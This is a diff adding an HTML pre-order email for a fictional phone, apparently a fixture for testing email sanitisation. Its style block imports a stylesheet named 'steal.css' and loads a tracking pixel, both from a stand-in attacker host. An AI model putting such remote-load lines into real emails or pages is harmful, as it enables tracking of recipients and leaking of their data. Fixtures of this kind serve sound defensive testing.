@@ -1,0 +1,21 @@
+<!doctype html><html><head><style>
+@import 'https://attacker.invalid/steal.css';
+body { margin: 0; background-color: #ffffff; }
+.mobile { display: none !important; }
+.desktop { display: block; }
+.hero { width: 640px; background: url(https://attacker.invalid/pixel); color: #222222; position: fixed; }
+.column { width: 50%; vertical-align: top; }
+img { display: block; }
+@media only screen and (max-width: 600px) {
+  .desktop { display: none !important; }
+  .mobile { display: block !important; }
+  table.hero { width: 100% !important; }
+  td.column { display: block; width: 100% !important; }
+}
+</style></head><body>
+<div class="desktop"><h1>Orchard Phone Pro</h1><p>Pre-order the next adventure.</p></div>
+<div class="mobile" style="display: none"><h1>Orchard Phone Pro</h1><p>Pre-order the next adventure.</p></div>
+<table class="hero" width="640"><tr>
+<td class="column"><img width="320" src="https://example.invalid/phone.png" alt="Fictional phone"><p>A brighter display.</p></td>
+<td class="column"><h2>Made for your day</h2><p>Explore the fictional collection.</p></td>
+</tr></table></body></html>
